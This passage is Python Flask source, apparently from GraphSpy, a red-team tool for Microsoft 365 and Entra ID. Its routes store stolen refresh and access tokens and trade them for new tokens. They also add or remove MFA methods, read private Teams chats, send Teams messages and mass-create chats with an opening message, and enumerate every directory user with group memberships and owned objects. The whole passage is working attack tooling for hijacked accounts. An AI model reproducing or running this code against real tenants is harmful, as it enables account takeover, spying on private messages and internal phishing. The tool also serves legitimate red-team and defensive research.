            return add_security_key_response
        except Exception as e:
            app.config["add_security_key_status"] = "FAILED"
            traceback.print_exc()
            return create_response(400, "An unexpected error occurred when trying to add the security key.")

    @app.get("/api/get_security_key_status")
    def api_get_security_key_status():
        return app.config["add_security_key_status"] if "add_security_key_status" in app.config else "UNKNOWN"

    @app.post("/api/verify_security_info")
    def api_verify_security_info():
        if not "access_token_id" in request.form:
            return f"[Error] No access_token_id specified.", 400
        access_token_id = request.form['access_token_id']
        if not "security_info_type" in request.form:
            return f"[Error] No security_info_type specified.", 400
        security_info_type = request.form['security_info_type']
        if not "verification_context" in request.form:
            return f"[Error] No verification_context specified.", 400
        verification_context = request.form['verification_context']
        if not "verification_data" in request.form:
            return f"[Error] No verification_data specified.", 400
        verification_data = request.form['verification_data']
        
        verify_security_info_response = verify_security_info(access_token_id, security_info_type, verification_context, verification_data)
        if not verify_security_info_response:
            return f"[Error] Failed to verify security info.", 400
        return verify_security_info_response

    @app.post("/api/delete_security_info")
    def api_delete_security_info():
        if not request.is_json:
            return f"[Error] Expecting JSON input.", 400
        request_json = request.get_json()
        if not "access_token_id" in request_json:
            return f"[Error] No access_token_id specified.", 400
        access_token_id = request_json['access_token_id']
        if not "security_info_type" in request_json:
            return f"[Error] No security_info_type specified.", 400
        security_info_type = request_json['security_info_type']
        if not "data" in request_json:
            return f"[Error] No data specified.", 400
        data = request_json['data']
        
        delete_security_info_response = delete_security_info(access_token_id, security_info_type, data)
        if not delete_security_info_response:
            return f"[Error] Failed to delete MFA method.", 400
        return delete_security_info_response

    @app.post("/api/validate_captcha")
    def api_validate_captcha():
        if not "access_token_id" in request.form:
            return f"[Error] No access_token_id specified.", 400
        access_token_id = request.form['access_token_id']
        if not "challenge_id" in request.form:
            return f"[Error] No challenge_id specified.", 400
        challenge_id = request.form['challenge_id']
        if not "captcha_solution" in request.form:
            return f"[Error] No captcha_solution specified.", 400
        captcha_solution = request.form['captcha_solution']
        if not "azure_region" in request.form:
            return f"[Error] No azure_region specified.", 400
        azure_region = request.form['azure_region']
        challenge_type = request.form['challenge_type'] if "challenge_type" in request.form else "Visual"
        
        captcha_response = validate_captcha(access_token_id, challenge_id, captcha_solution, azure_region, challenge_type)
        if not captcha_response:
            return f"[Error] Failed to validate captcha.", 400
        if not captcha_response["CaptchaSolved"]:
            return f"[Error] Captcha not solved. Received error: {captcha_response['ErrorCode']}", 400
        return captcha_response

    @app.post("/api/initialize_mobile_app_registration")
    def api_initialize_mobile_app_registration():
        if not "access_token_id" in request.form:
            return f"[Error] No access_token_id specified.", 400
        access_token_id = request.form['access_token_id']
        if not "security_info_type" in request.form:
            return f"[Error] No security_info_type specified.", 400
        security_info_type = request.form['security_info_type']
        
        initialize_mobile_app_registration_response = initialize_mobile_app_registration(access_token_id, security_info_type)
        if not initialize_mobile_app_registration_response:
            return f"[Error] Failed to initialize mobile app registration.", 400
        return initialize_mobile_app_registration_response

        # ========== Refresh Tokens ==========

    @app.route("/api/list_refresh_tokens")
    def api_list_refresh_tokens():
        rows = query_db_json("select * from refreshtokens")
        return json.dumps(rows)

    @app.route("/api/get_refresh_token/<id>")
    def api_get_refresh_token(id):
        rows = query_db_json("select * from refreshtokens WHERE id = ?",[id],one=True)
        return json.dumps(rows)

    @app.post('/api/add_refresh_token')
    def api_add_refresh_token():
        refreshtoken = request.form['refreshtoken'] if "refreshtoken" in request.form else ""
        user = request.form['user'] if "user" in request.form else ""
        tenant = request.form['tenant_domain'] if "tenant_domain" in request.form else ""
        resource = request.form['resource'] if "resource" in request.form else ""
        description = request.form['description'] if "description" in request.form else ""
        foci = 1 if "foci" in request.form else 0
        client_id = request.form['client_id'] if "client_id" in request.form else "d3590ed6-52b3-4102-aeff-aad2292ab01c"
        if refreshtoken and tenant and resource:
            save_refresh_token(refreshtoken, description, user, tenant, resource, foci, client_id)
        return redirect('/refresh_tokens')

    @app.post('/api/refresh_to_access_token')
    def api_refresh_to_access_token():
        refresh_token_id = request.form['refresh_token_id'] if "refresh_token_id" in request.form else ""
        client_id = request.form['client_id'] if "client_id" in request.form else "defined_in_token"
        resource = request.form['resource'] if "resource" in request.form else "defined_in_token"
        scope = request.form['scope'] if "scope" in request.form else ""
        scope = scope if scope else "https://graph.microsoft.com/.default openid offline_access"
        api_version = int(request.form['api_version']) if "api_version" in request.form else 1
        api_version = api_version if api_version in [1,2] else 1
        store_refresh_token = True if "store_refresh_token" in request.form else False
        result = 0
        try:
            result = refresh_to_access_token(refresh_token_id, client_id, resource, scope, store_refresh_token, api_version)
            status_code = 200 if isinstance(result ,int) and result != 0 else 400
            return f"{result}", status_code
        except Exception as e:
            traceback.print_exc()
            return f"[Error] Unexpected error occurred. Check your input for any issues. Exception: {repr(e)}", 400

    @app.route("/api/delete_refresh_token/<id>")
    def api_delete_refresh_token(id):
        execute_db("DELETE FROM refreshtokens where id = ?",[id])
        return "true"

    @app.route("/api/active_refresh_token/<id>")
    def api_set_active_refresh_token(id):
        previous_id = query_db("SELECT value FROM settings WHERE setting = 'active_refresh_token_id'",one=True)
        if not previous_id:
            execute_db("INSERT INTO settings (setting, value) VALUES ('active_refresh_token_id',?)",(id,))
        else:
            execute_db("UPDATE settings SET value = ? WHERE setting = 'active_refresh_token_id'",(id,))
        return id

    @app.route("/api/active_refresh_token")
    def api_get_active_refresh_token():
        active_refresh_token = query_db("SELECT value FROM settings WHERE setting = 'active_refresh_token_id'",one=True)
        return f"{active_refresh_token[0]}" if active_refresh_token else "0"

        # ========== Access Tokens ==========

    @app.route("/api/list_access_tokens")
    def api_list_access_tokens():
        rows = query_db_json("select * from accesstokens")
        return json.dumps(rows)
    
    @app.post('/api/add_access_token')
    def api_add_access_token():
        accesstoken = request.form['accesstoken'] if "accesstoken" in request.form and request.form['accesstoken'] else ""
        description = request.form['description'] if "description" in request.form else ""
        if accesstoken:
            save_access_token(accesstoken, description)
        return redirect('/access_tokens')

    @app.route("/api/get_access_token/<id>")
    def api_get_access_token(id):
        rows = query_db_json("select * from accesstokens WHERE id = ?",[id],one=True)
        return json.dumps(rows)

    @app.route("/api/decode_token/<id>")
    def api_decode_token(id):
        rows = query_db("SELECT accesstoken FROM accesstokens WHERE id = ?",[id],one=True)
        if rows:
            decoded_accesstoken = jwt.decode(rows[0], options={"verify_signature": False})
            return decoded_accesstoken
        else:
            return f"[Error] Could not find access token with id {id}"

    @app.route("/api/delete_access_token/<id>")
    def api_delete_access_token(id):
        execute_db("DELETE FROM accesstokens WHERE id = ?",[id])
        return "true"

    @app.route("/api/active_access_token/<id>")
    def api_set_active_access_token(id):
        previous_id = query_db("SELECT value FROM settings WHERE setting = 'active_access_token_id'",one=True)
        if not previous_id:
            execute_db("INSERT INTO settings (setting, value) VALUES ('active_access_token_id',?)",(id,))
        else:
            execute_db("UPDATE settings SET value = ? WHERE setting = 'active_access_token_id'",(id,))
        return id

    @app.route("/api/active_access_token")
    def api_get_active_access_token():
        active_access_token = query_db("SELECT value FROM settings WHERE setting = 'active_access_token_id'",one=True)
        return f"{active_access_token[0]}" if active_access_token else "0"
    
        # ========== Generic Requests ==========

    @app.post("/api/generic_graph")
    def api_generic_graph():
        graph_uri = request.form['graph_uri']
        access_token_id = request.form['access_token_id']
        method = request.form.get('method') or 'GET'
        body = json.loads(request.form.get('body') or '{}')
        graph_response = graph_request(graph_uri, access_token_id, method, body)
        return graph_response
    
    @app.route('/api/generic_graph_upload', methods=['POST'])
    def api_generic_graph_upload():
        try:
            upload_uri = request.form['upload_uri']
            access_token_id = request.form['access_token_id']
            file = request.files['file']

            if not upload_uri or not access_token_id or not file:
                return json.dumps({"error": "Missing required parameters"}), 400

            return graph_upload_request(upload_uri, access_token_id, file)
        except Exception as e:
            print(f"An error occurred: {e}")
            return json.dumps({"error": "An internal server error occurred.", "details": str(e)}), 500

    @app.post("/api/custom_api_request")
    def api_custom_api_request():
        if not request.is_json:
            return f"[Error] Expecting JSON input.", 400
        request_json = request.get_json()
        uri = request_json['uri'] if 'uri' in request_json else ''
        access_token_id = request_json['access_token_id'] if 'access_token_id' in request_json else 0
        method = request_json['method'] if 'method' in request_json else 'GET'
        request_type = request_json['request_type'] if 'request_type' in request_json else 'text'
        body = request_json['body'] if 'body' in request_json else ''
        headers = request_json['headers'] if 'headers' in request_json else {}
        variables = request_json['variables'] if 'variables' in request_json else {}

        if not (uri and access_token_id and method):
            return f"[Error] URI, Access Token ID and Method are mandatory!", 400
        elif request_type not in ["text", "json", "urlencoded", "xml"]:
            return f"[Error] Invalid request type '{request_type}'. Should be one of the following values: text, json, urlencoded, xml", 400
        elif type(headers) != dict or type(variables) != dict:
            return f"[Error] Expecting json input for headers and variables. Received '{type(headers)}' and '{type(variables)}' respectively.", 400

        for variable_name, variable_value in variables.items():
            uri = uri.replace(variable_name, variable_value)
            body = body.replace(variable_name, variable_value)
            temp_headers = {}
            for header_name, header_value in headers.items():
                new_header_name = header_name.replace(variable_name, variable_value) if type(header_name) == str else header_name
                new_header_value = header_value.replace(variable_name, variable_value) if type(header_value) == str else header_value
                temp_headers[new_header_name] =new_header_value
            headers = temp_headers
        try:
            api_response = generic_request(uri, access_token_id, method, request_type, body, headers)
        except Exception as e:
            traceback.print_exc()
            return f"[Error] Unexpected error occurred. Check your input for any issues. Exception: {repr(e)}", 400
        return api_response
        
    @app.post("/api/save_request_template")
    def api_save_request_template():
        if not request.is_json:
            return f"[Error] Expecting JSON input.", 400
        request_json = request.get_json()
        template_name = request_json['template_name'] if 'template_name' in request_json else ''
        uri = request_json['uri'] if 'uri' in request_json else ''
        method = request_json['method'] if 'method' in request_json else 'GET'
        request_type = request_json['request_type'] if 'request_type' in request_json else 'text'
        body = request_json['body'] if 'body' in request_json else ''
        headers = request_json['headers'] if 'headers' in request_json else {}
        variables = request_json['variables'] if 'variables' in request_json else {}

        if not (template_name and uri and method):
            return f"[Error] Template Name, URI and Method are mandatory!", 400
        elif request_type not in ["text", "json", "urlencoded", "xml"]:
            return f"[Error] Invalid request type '{request_type}'. Should be one of the following values: text, json, urlencoded, xml", 400
        elif type(headers) != dict or type(variables) != dict:
            return f"[Error] Expecting json input for headers and variables. Received '{type(headers)}' and '{type(variables)}' respectively.", 400
        
        template_exists = False
        try:
            # If a request template with the same name already exists, delete it first
            existing_request_template = query_db_json("SELECT * FROM request_templates WHERE template_name = ?",[template_name],one=True)
            if existing_request_template:
                template_exists = True
                execute_db("DELETE FROM request_templates where id = ?",[existing_request_template["id"]])
            # Save the new request template
            execute_db("INSERT INTO request_templates (template_name, uri, method, request_type, body, headers, variables) VALUES (?,?,?,?,?,?,?)",(
                template_name,
                uri,
                method,
                request_type,
                body,
                json.dumps(headers),
                json.dumps(variables)
                )
            )
        except Exception as e:
            traceback.print_exc()
            return f"[Error] Unexpected error occurred. Check your input for any issues. Exception: {repr(e)}", 400
        if template_exists:
            return f"[Success] Updated configuration for request template '{template_name}'."
        return f"[Success] Saved template '{template_name}' to database."
    
    @app.route("/api/get_request_templates/<template_id>")
    def api_request_templates(template_id):
        request_template = query_db_json("SELECT * FROM request_templates WHERE id = ?",[template_id],one=True)
        if request_template:
            request_template['headers'] = json.loads(request_template['headers'])
            request_template['variables'] = json.loads(request_template['variables'])
        if not request_template:
            return f"[Error] Unable to find request template with ID '{template_id}'.", 400
        return request_template

    @app.route("/api/list_request_templates")
    def api_list_request_templates():
        request_templates = query_db_json("SELECT * FROM request_templates")
        for i in range(len(request_templates)):
            request_templates[i]['headers'] = json.loads( request_templates[i]['headers'])
            request_templates[i]['variables'] = json.loads(request_templates[i]['variables'])
        return request_templates
    
    @app.post("/api/delete_request_template")
    def api_delete_request_template():
        if not "template_id" in request.form:
            return f"[Error] No template_id specified.", 400
        template_id = request.form['template_id']
        existing_request_template = query_db_json("SELECT * FROM request_templates WHERE id = ?",[template_id],one=True)
        if not existing_request_template:
             return f"[Error] Unable to find request template with ID '{template_id}'.", 400
        execute_db("DELETE FROM request_templates where id = ?",[template_id])
        return f"[Success] Deleted request template '{existing_request_template['template_name']}' from database."

        # ========== Teams ==========

    @app.post("/api/get_teams_conversations")
    def api_get_teams_conversations():
        if not "access_token_id" in request.form:
            return f"[Error] No access_token_id specified.", 400
        access_token_id = request.form['access_token_id']
        teams_settings = getTeamsSettings(access_token_id)
        if not teams_settings:
            return f"[Error] Unable to obtain teams settings with access token {access_token_id}.", 400
        chat_service_uri = json.loads(teams_settings['teams_settings_raw'])['regionGtms']['chatService']
        uri = f"{chat_service_uri}/v1/users/ME/conversations?view=msnp24Equivalent&pageSize=500"
        headers = {"Authentication":f"skypetoken={teams_settings['skypeToken']}"}
        response = generic_request(uri, access_token_id, "GET", "text", "", headers)
        if response['response_status_code'] == 200 and response['response_type'] == "json":
            return json.loads(response['response_text'])
        return f"[Error] Something went wrong trying to obtain Teams Conversations. Received response status {response['response_status_code']} and response type {response['response_type']}", 400

    @app.post("/api/get_teams_conversation_messages")
    def api_get_teams_conversation_messages():
        if not "access_token_id" in request.form:
            return f"[Error] No access_token_id specified.", 400
        access_token_id = request.form['access_token_id']
        if not "conversation_link" in request.form:
            return f"[Error] No conversation_link specified.", 400
        conversation_link = request.form['conversation_link']
        teams_settings = getTeamsSettings(access_token_id)
        if not teams_settings:
            return f"[Error] Unable to obtain teams settings with access token {access_token_id}.", 400
        uri = f"{conversation_link}?startTime=0&view=msnp24Equivalent&pageSize=200"
        headers = {"Authentication":f"skypetoken={teams_settings['skypeToken']}"}
        response = generic_request(uri, access_token_id, "GET", "text", "", headers)
        if response['response_status_code'] == 200 and response['response_type'] == "json":
            conversation_messages = json.loads(response['response_text'])
            # Add `isFromMe: True` to the message if the message is from the current user.
            conversation_messages["messages"] = [{**message, "isFromMe": message["from"].endswith(teams_settings["skype_id"])} for message in conversation_messages["messages"]]
            return conversation_messages
        return f"[Error] Something went wrong trying to obtain Teams Conversations. Received response status {response['response_status_code']} and response type {response['response_type']}", 400

    @app.post("/api/send_teams_conversation_message")
    def api_send_teams_conversation_message():
        if not "access_token_id" in request.form:
            return f"[Error] No access_token_id specified.", 400
        access_token_id = request.form['access_token_id']
        if not "conversation_link" in request.form:
            return f"[Error] No conversation_link specified.", 400
        conversation_link = request.form['conversation_link']
        if not "message_content" in request.form:
            return f"[Error] No message_content specified.", 400
        message_content = request.form['message_content']
        teams_settings = getTeamsSettings(access_token_id)
        if not teams_settings:
            return f"[Error] Unable to obtain teams settings with access token {access_token_id}.", 400
        headers = {"Authentication":f"skypetoken={teams_settings['skypeToken']}", "User-Agent":get_user_agent()}
        body = {
            "messagetype": "RichText/Html",
            "content": message_content
        }
        response = requests.post(conversation_link, headers=headers, json=body)
        if response.status_code >= 200 and response.status_code < 300:
            message_id = response.json()["OriginalArrivalTime"] if "OriginalArrivalTime" in response.json() else "Unknown"
            return f"{message_id}"
        return f"[Error] Something went wrong trying to send Teams message. Received response status {response.status_code}", 400
        gspy_log.error(f"Failed sending teams message. Received response status {response.status_code}. Response body:\n {response.content}")

    @app.post("/api/get_teams_conversation_members")
    def api_get_teams_conversation_members():
        if not "access_token_id" in request.form:
            return f"[Error] No access_token_id specified.", 400
        access_token_id = request.form['access_token_id']
        if not "conversation_id" in request.form:
            return f"[Error] No conversation_id specified.", 400
        conversation_id = request.form['conversation_id']
        teams_settings = getTeamsSettings(access_token_id)
        if not teams_settings:
            return f"[Error] Unable to obtain teams settings with access token {access_token_id}.", 400
        teams_and_channel_service_uri = json.loads(teams_settings['teams_settings_raw'])['regionGtms']['teamsAndChannelsService']
        uri = f"{teams_and_channel_service_uri}/beta/teams/{conversation_id}/members"
        response = generic_request(uri, access_token_id, "GET", "text", "", {})
        if response['response_status_code'] == 200 and response['response_type'] == "json":
            conversation_members = json.loads(response['response_text'])
            # Add `isCurrentUser: True` to the member if the member is the current user.
            conversation_members = [{**member, "isCurrentUser": member["mri"].endswith(teams_settings["skype_id"])} for member in conversation_members]
            gspy_log.debug(f"Found {len(conversation_members)} members in conversation '{conversation_id}'")
            return conversation_members
        gspy_log.error(f"Failed listing members in conversation '{conversation_id}'. Received response status {response['response_status_code']}. Response body: \n{response['response_text']}")
        return f"[Error] Something went wrong trying to obtain Teams Members. Received response status {response['response_status_code']} and response type {response['response_type']}", 400

    @app.get("/api/get_teams_image")
    def api_get_teams_image():
        if not "access_token_id" in request.args:
            return f"[Error] No access_token_id specified.", 400
        access_token_id = request.args['access_token_id']
        if not "image_uri" in request.args:
            return f"[Error] No image_uri specified.", 400
        image_uri = request.args['image_uri']
        teams_settings = getTeamsSettings(access_token_id)
        if not teams_settings:
            return f"[Error] Unable to obtain teams settings with access token {access_token_id}.", 400
        cookies = {"skypetoken_asm":teams_settings['skypeToken']}
        headers = {"User-Agent":get_user_agent()}
        response = requests.get(image_uri, cookies=cookies, headers=headers)
        if response.status_code == 200:
            return Response(response.content, mimetype=response.headers['Content-Type'])
        return f"[Error] Something went wrong trying to obtain teams image. Received response status {response.status_code} and response type {response.headers['Content-Type'] if 'Content-Type' in response.headers else 'empty'}", 400
        
    @app.post("/api/list_teams_users")
    def api_list_teams_users():
        if not "access_token_id" in request.form:
            return f"[Error] No access_token_id specified.", 400
        access_token_id = request.form['access_token_id']
        teams_settings = getTeamsSettings(access_token_id)
        if not teams_settings:
            return f"[Error] Unable to obtain teams settings with access token {access_token_id}.", 400
        teams_and_channel_service_uri = json.loads(teams_settings['teams_settings_raw'])['regionGtms']['teamsAndChannelsService']
        base_uri = f"{teams_and_channel_service_uri}/beta/users?top=999"
        teams_users = []
        next_skiptoken = ""
        while True:
            uri = f"{base_uri}&skipToken={next_skiptoken}" if next_skiptoken else base_uri
            response = generic_request(uri, access_token_id, "GET", "text", "")
            if not (response['response_status_code'] == 200 and response['response_type'] == "json"):
                break
            responseJson = json.loads(response['response_text'])
            if not "users" in responseJson:
                break
            teams_users += responseJson["users"]
            if not "skipToken" in responseJson:
                return teams_users
            next_skiptoken = responseJson["skipToken"]
        return f"[Error] Something went wrong trying to list Teams Users. Received response status {response['response_status_code']} and response type {response['response_type']}", 400

    @app.get("/api/get_teams_user_details")
    def api_get_teams_user_details():
        if not "access_token_id" in request.args:
            return f"[Error] No access_token_id specified.", 400
        access_token_id = request.args['access_token_id']
        teams_settings = getTeamsSettings(access_token_id)
        if not teams_settings:
            return f"[Error] Unable to obtain teams settings with access token {access_token_id}.", 400
        teams_and_channel_service_uri = json.loads(teams_settings['teams_settings_raw'])['regionGtms']['teamsAndChannelsService']
        if not "user_id" in request.args:
            return f"[Error] No user_id specified. Specify a valid UPN, ObjectID or MRI of the user", 400
        user_id = request.args['user_id']
        uri = f"{teams_and_channel_service_uri}/beta/users/{user_id}"
        headers = {"x-ms-client-version":"27/1.0.0.2020101241"}
        if "external" in request.args and request.args["external"].lower() == "true":
            uri += "/externalsearchv3"
        response = generic_request(uri, access_token_id, "GET", "text", "", headers)
        if response['response_status_code'] == 200 and response['response_type'] == "json":
            return json.loads(response['response_text'])
        elif response['response_status_code'] == 404:
            return f"[Error] User '{user_id} not found'", 404
        return f"[Error] Something went wrong trying to list Teams Users. Received response status {response['response_status_code']} and response type {response['response_type']}", 400

    @app.post("/api/create_teams_conversation")
    def api_create_teams_conversation(): # access_token_id, members, type, topic, message_content
        if not request.is_json:
            return f"[Error] Expecting JSON input.", 400
        request_json = request.get_json()
        if not "access_token_id" in request_json:
            return f"[Error] No access_token_id specified.", 400
        access_token_id = request_json['access_token_id']
        if not "members" in request_json:
            return f"[Error] No members specified.", 400
        members = request_json['members']
        if not "type" in request_json:
            return f"[Error] No conversation type specified.", 400
        conversation_type = request_json['type']
        if not conversation_type in ["direct_message", "group_chat"]:
            return f"[Error] Type needs to be either 'direct_message' or 'group_chat'.", 400
        teams_settings = getTeamsSettings(access_token_id)
        if not teams_settings:
            return f"[Error] Unable to obtain teams settings with access token {access_token_id}.", 400
        chat_service_uri = json.loads(teams_settings['teams_settings_raw'])['regionGtms']['chatService']
        uri = f"{chat_service_uri}/v1/threads"
        headers = {"Authentication":f"skypetoken={teams_settings['skypeToken']}", "User-Agent":get_user_agent()}
        # Adding ourself first
        conversation_members = [{
            "id": f"8:{teams_settings['skype_id']}",
            "role": "Admin"
        }]
        conversation_properties = {
            "threadType": "chat",
            "chatFilesIndexId": "2",
            "fixedRoster": "true",
            "uniquerosterthread": "true" if conversation_type == "direct_message" else "false"
        }
        if "topic" in request_json:
            conversation_properties["topic"] = request_json["topic"]
        created_conversations = []
        if conversation_type == "direct_message":
            for member in members:
                body = {
                    "members": conversation_members[:],
                    "properties": conversation_properties
                }
                body["members"].append({
                    "id": member,
                    "role": "Admin"
                })
                response = requests.post(uri, headers=headers, json=body)
                if response.status_code >= 200 and response.status_code < 300 and "Location" in response.headers:
                    conversation_id_regex = re.search('https:\/\/emea\.ng\.msg\.teams\.microsoft\.com\/v1\/threads\/(.*)$', response.headers["Location"])
                    if conversation_id_regex:
                        conversation_id = conversation_id_regex.group(1)
                        created_conversations.append(conversation_id)
                        gspy_log.debug(f"Created conversation with member {member}. Conversation ID: {conversation_id}")
                        continue
                gspy_log.error(f"Failed creating direct message conversation with user {member}. Received response status {response.status_code}.\n{response.content}")
        elif conversation_type == "group_chat":
            for member in members:
                conversation_members.append({
                    "id": member,
                    "role": "Admin"
                })
            body = {
                "members": conversation_members,
                "properties": conversation_properties
            }
            response = requests.post(uri, headers=headers, json=body)
            if response.status_code >= 200 and response.status_code < 300 and "Location" in response.headers:
                conversation_id_regex = re.search('https:\/\/emea\.ng\.msg\.teams\.microsoft\.com\/v1\/threads\/(.*)$', response.headers["Location"])
                if conversation_id_regex:
                    conversation_id = conversation_id_regex.group(1)
                    created_conversations.append(conversation_id)
                    gspy_log.debug(f"Created conversation with {len(members)} members. Conversation ID: {conversation_id}")
                else:
                    gspy_log.error(f"Failed creating group chat conversation. Received response status {response.status_code}\n{response.content}.")
            else:
                gspy_log.error(f"Failed creating group chat conversation. Received response status {response.status_code}.\n{response.content}")
        gspy_log.debug(f"Created {len(created_conversations)} conversations.")
        if len(created_conversations) == 0:
            return f"[Error] Something went wrong creating the conversation(s).", 400
        # If a message is specified, send an initial message to every created conversation
        if "message_content" in request_json:
            body = {
                "messagetype": "RichText/Html",
                "content": request_json["message_content"]
            }
            for conversation_id in created_conversations:
                conversation_link = f"{chat_service_uri}/v1/users/ME/conversations/{conversation_id}/messages"
                response = requests.post(conversation_link, headers=headers, json=body)
                if response.status_code >= 200 and response.status_code < 300:
                    message_id = response.json()["OriginalArrivalTime"] if "OriginalArrivalTime" in response.json() else "Unknown"
                    gspy_log.debug(f"Sent message to conversation {conversation_id}. Message ID: {message_id}")
                else:
                    gspy_log.error(f"Failed sending message to {conversation_id}. Received response status {response.status_code}.\n{response.content}")
        return created_conversations

        # ========== Entra ID ==========

    @app.get("/api/get_entra_users")
    def api_get_entra_users():
        if not "access_token_id" in request.args:
            return f"[Error] No access_token_id specified.", 400
        access_token_id = request.args['access_token_id']
        uri = f"https://graph.microsoft.com/v1.0/users?$top=999"
        if "customize_properties" in request.args and request.args["customize_properties"] != " ":
            uri += f"&$select={urllib.parse.quote_plus(request.args['customize_properties'])}"
        if "expand_memberships" in request.args and request.args["expand_memberships"]:
            uri += "&$expand=transitiveMemberOf"
        users_list = []
        for x in range(5000):
            response = generic_request(uri, access_token_id, "GET", "text", "")
            if response['response_status_code'] == 200 and response['response_type'] == "json":
                response_json = json.loads(response['response_text'])
                users_list += response_json["value"]
                gspy_log.debug(f"Retrieved {len(response_json['value'])} users. {len(users_list)} total users so far.")
                if "@odata.nextLink" in response_json:
                    uri = response_json["@odata.nextLink"]
                else:
                    gspy_log.debug(f"All users retrieved.")
                    break
            else:
                gspy_log.error(response)
                return f"[Error] Something went wrong trying to obtain Entra ID Users. Received response status {response['response_status_code']} and response type {response['response_type']}", 400
        return users_list

    @app.get("/api/get_entra_user_details/<user_id>")
    def api_get_entra_user_details(user_id):
        if not "access_token_id" in request.args:
            return f"[Error] No access_token_id specified.", 400
        access_token_id = request.args['access_token_id']
        parsed_user_id = urllib.parse.quote_plus(user_id)
        batch_body = {
            "requests": [
                {
                    "id": "userDetails",
                    "method": "GET",
                    "url": f"/users/{parsed_user_id}?$expand=transitiveMemberOf&$select=displayName,givenName,surname,userPrincipalName,mail,otherMails,proxyAddresses,mobilePhone,businessPhones,faxNumber,createdDateTime,lastPasswordChangeDateTime,refreshTokensValidFromDateTime,userType,companyName,jobTitle,department,officeLocation,streetAddress,city,state,country,preferredLanguage,surname,userPrincipalName,id,accountEnabled,passwordPolicies,licenseAssignmentStates,creationType,customSecurityAttributes,onPremisesSyncEnabled,onPremisesDistinguishedName,onPremisesSamAccountName,onPremisesUserPrincipalName,onPremisesDomainName,onPremisesImmutableId,onPremisesLastSyncDateTime,onPremisesSecurityIdentifier,securityIdentifier"
                },
                {
                    "id": "ownedObjects",
                    "method": "GET",
                    "url": f"/users/{parsed_user_id}/ownedObjects"
                },
                {
                    "id": "ownedDevices",
                    "method": "GET",
                    "url": f"/users/{parsed_user_id}/ownedDevices"
                },
                {
                    "id": "appRoleAssignments",
                    "method": "GET",
                    "url": f"/users/{parsed_user_id}/appRoleAssignments"
                },
                {
                    "id": "oauth2PermissionGrants",
                    "method": "GET",
                    "url": f"/users/{parsed_user_id}/oauth2PermissionGrants"
                }
            ]
        }
        batch_uri = "https://graph.microsoft.com/v1.0/$batch"
        batch_response = generic_request(batch_uri, access_token_id, "POST", "json", batch_body)
        if not (batch_response['response_status_code'] == 200 and batch_response['response_type'] == "json"):
            gspy_log.error(f"Something went wrong trying to obtain user details of '{user_id}'.")
            gspy_log.error(batch_response)
            return f"[Error] Something went wrong trying to obtain user details of '{user_id}'. Received response status {batch_response['response_status_code']} and response type {batch_response['response_type']}", 400
        batch_response_list = json.loads(batch_response['response_text'])["responses"]
        user_details = [response["body"] for response in batch_response_list if response["id"] == "userDetails" and response["status"] == 200]
        if len(user_details) == 0:
            gspy_log.error(f"Something went wrong trying to obtain user details of '{user_id}'.")
            gspy_log.error(batch_response)
            return f"[Error] Something went wrong trying to obtain user details of '{user_id}'.", 400
        user_details = user_details[0]
        for response in batch_response_list:
            if response["id"] == "userDetails":
                continue
            user_details[response["id"]] = response["body"]["value"] if "value" in response["body"] else []
        return user_details

        # ========== Database ==========
    
    @app.get("/api/list_databases")
    def api_list_databases():
        return list_databases()

    @app.post("/api/create_database")
    def api_create_database():
        database_name = request.form['database']
        if not database_name:
            return f"[Error] Please specify a database name."
        database_name = database_name if database_name.endswith(".db") else f"{database_name}.db"
        db_path = safe_join(app.config['graph_spy_db_folder'],database_name)
        if not db_path:
            return f"[Error] Invalid database name '{database_name}'. Try again with another name."
        if(os.path.exists(db_path)):
            return f"[Error] Database '{database_name}' already exists. Try again with another name."
        old_db = app.config['graph_spy_db_path']
        app.config['graph_spy_db_path'] = db_path
        init_db()
        if(not os.path.exists(db_path)):
            app.config['graph_spy_db_path'] = old_db
            return f"[Error] Failed to create database '{database_name}'."
        return f"[Success] Created and activated '{database_name}'."
    
    @app.post("/api/activate_database")
    def api_activate_database():
        database_name = request.form['database']
        db_path = safe_join(app.config['graph_spy_db_folder'],database_name)
        if(not os.path.exists(db_path)):
            return f"[Error] Database file '{db_path}' not found."
        app.config['graph_spy_db_path'] = db_path
        update_db()
        return f"[Success] Activated database '{database_name}'."
    
    @app.post("/api/duplicate_database")
    def api_duplicate_database():
        database_name = request.form['database']
        db_path = safe_join(app.config['graph_spy_db_folder'],database_name)
        if(not os.path.exists(db_path)):
            return f"[Error] Database file '{db_path}' not found."
        for i in range(1,100):
            new_path = f"{db_path.strip('.db')}_{i}.db"
            if(not os.path.exists(new_path)):
                shutil.copy2(db_path, new_path)
                return f"[Success] Duplicated database '{database_name}' to '{new_path.split('/')[-1]}'."
        return f"[Error] Could not duplicate database '{database_name}'."

    @app.post("/api/delete_database")
    def api_delete_database():
        database_name = request.form['database']
        db_path = safe_join(app.config['graph_spy_db_folder'],database_name)
        if app.config['graph_spy_db_path'].lower() == db_path.lower():
            return "[Error] Can't delete the active database. Select a different database first."
        os.remove(db_path)
        if(not os.path.exists(db_path)):
            return f"[Success] Database '{database_name}' deleted."
        else:
            return f"[Error] Failed to delete '{database_name}' at '{db_path}'."
    
        # ========== Settings ==========
    
    @app.post("/api/set_table_error_messages")
    def api_set_table_error_messages():
        state = request.form['state']
        if state not in ["enabled", "disabled"]:
            return f"[Error] Invalid state '{state}'."
        app.config['table_error_messages'] = state
        return f"[Success] {state.capitalize()} datatable error messages."
    
    @app.get("/api/get_settings")
    def api_get_settings():
        settings_raw = query_db_json("SELECT * FROM settings")
        #settings_json = [{setting["setting"] : setting["value"]} for setting in settings_raw]
        settings_json = {setting["setting"] : setting["value"] for setting in settings_raw}
        return settings_json
        
    @app.get("/api/get_user_agent")
    def api_get_user_agent():
        return get_user_agent()

    @app.post("/api/set_user_agent")
    def api_set_user_agent():
        user_agent = request.form['user_agent'] if "user_agent" in request.form else ""
        if not user_agent:
            return "[Error] User agent not specified!", 400 
        if not set_user_agent(user_agent):
            return f"[Error] Unable to set user agent to '{user_agent}'!", 400 
        return f"[Success] User agent set to '{user_agent}'!" 

    # ========== Other ==========

    @app.errorhandler(AppError)
    def handle_app_error(e):
        gspy_log.error(f"AppError in {e.func_name}():{e.line_number} - {e.message}")
        return jsonify({"message": e.message}), e.status_code

    @app.teardown_appcontext
    def close_connection(exception):
        db = getattr(g, '_database', None)
        if db is not None:
            db.close()
def main():
    # Banner
    print(fr"""
   ________                             _________
  /       /  by RedByte1337    __      /        /      v{__version__}
 /  _____/___________  ______ |  |__  /   _____/_____ ______ 
/   \  __\_  __ \__  \ \____ \|  |  \ \_____  \\____ \   |  |
\    \_\  \  | \/  __ \|  |_> |   \  \/        \  |_> \___  |
